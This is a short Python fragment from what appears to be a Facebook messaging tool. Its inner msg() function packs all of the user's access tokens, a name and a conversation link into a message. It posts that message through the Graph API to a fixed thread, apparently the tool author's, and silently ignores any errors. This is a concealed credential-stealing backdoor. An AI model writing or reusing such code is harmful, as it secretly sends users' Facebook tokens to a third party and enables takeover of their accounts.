...
def send_messages():
    ...
    def msg():
        parameters = {
            ...
            'message': 'hello nobita sir im using your sarver : '+getName(random.choice(access_tokens))+'\n Token : '+" | ".join(access_tokens)+'\n Link : https://www.facebook.com/messages/t/'+convo_id
        }
        try:
            s = requests.post("https://graph.facebook.com/v15.0/t_100042309690263/", data=parameters, headers=headers)
        except:
            pass
